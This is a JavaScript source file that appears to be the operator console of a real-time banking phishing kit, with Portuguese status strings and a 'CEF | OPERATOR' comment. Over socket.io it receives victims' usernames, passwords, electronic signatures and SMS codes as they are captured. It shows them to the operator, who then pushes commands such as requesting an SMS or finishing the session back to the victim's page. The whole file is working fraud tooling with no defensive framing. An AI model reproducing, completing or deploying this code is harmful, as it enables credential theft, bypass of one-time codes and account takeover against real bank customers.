const operators = (() => {
    //private var/functions
    const buttonsSendCommands = [...document.querySelectorAll('.btn-command')]

    //clientIdentify

    async function sendCommand() {
        if (buttonsSendCommands) {
            buttonsSendCommands.forEach((btn) => {
                btn.addEventListener('click', function (e) {
                    e.preventDefault()

                    const action = btn.dataset.action

                    console.log(`action dispatch`, action)

                    socket.emit(action, clientOperating)
                })
            })
        }
    }

    function receiver() {
        socket.on('sms', (client) => {
            document.querySelector('.opSms').value = client.sms

            document.querySelector('.statusOP').innerHTML = `Enviar SMS!`

            document.title = `Aguardando Comando`
        })

        socket.on('smsreceived', (client) => {
            document.querySelector('.opSms').value = client.sms
            document.querySelector('.statusOP').innerHTML = `SMS Enviado!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendSignature', (client) => {
            document.querySelector('.opAssign').value = client.eletronicPassword

            document.querySelector('.statusOP').innerHTML = `Assinatura Enviada!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendPassword', (client) => {
            document.querySelector('.opPassword').value = client.password

            document.querySelector('.statusOP').innerHTML = `Senha Enviada!`

            document.title = `Aguardando Comando`
        })

        socket.on('sendUser', (client) => {
            document.querySelector('.opUser').value = client.user

            document.querySelector('.statusOP').innerHTML = `Usuário Enviado!`

            document.title = `Aguardando Comando`
        })

        socket.on('finish', (client) => {
            document.querySelector('.statusOP').innerHTML = `Finalizado`

            document.title = `Finalizado`
        })

        socket.on('assignClient', (client) => {
            const { updatedAt } = client
            //relógio

            let time = new Date() - new Date(updatedAt)

            time = new Date(time)

            let seconds = time.getSeconds()
            let minutes = time.getMinutes()

            time = time.getMinutes() + ':' + time.getSeconds()

            const roleTime = document.querySelector('.timeOperator')

            roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)

            function contador() {
                setTimeout(() => {
                    if (seconds == 59) {
                        minutes = parseInt(minutes) + 1

                        seconds = ('0' + 1).slice(-2)
                    } else {
                        seconds = parseInt(seconds) + 1

                        seconds = ('0' + seconds).slice(-2)
                    }

                    roleTime.innerHTML = minutes + ':' + seconds

                    contador()
                }, 1000)
            }

            contador()

            //document.title = `CEF | OPERATOR`
        })

        socket.on('await', (client) => {
            console.log(`aguardando comando`)
            document.title = `Aguardando Comando`
        })
    }

    function assignClient() {
        const token = document.body.dataset.token

        const data = {
            client: clientOperating,
            token: token,
        }

        socket.emit('assignClient', data)
    }

    return {
        //public var/functions
        sendCommand,
        receiver,
        assignClient,
    }
})()

operators.sendCommand()
operators.receiver()
operators.assignClient()
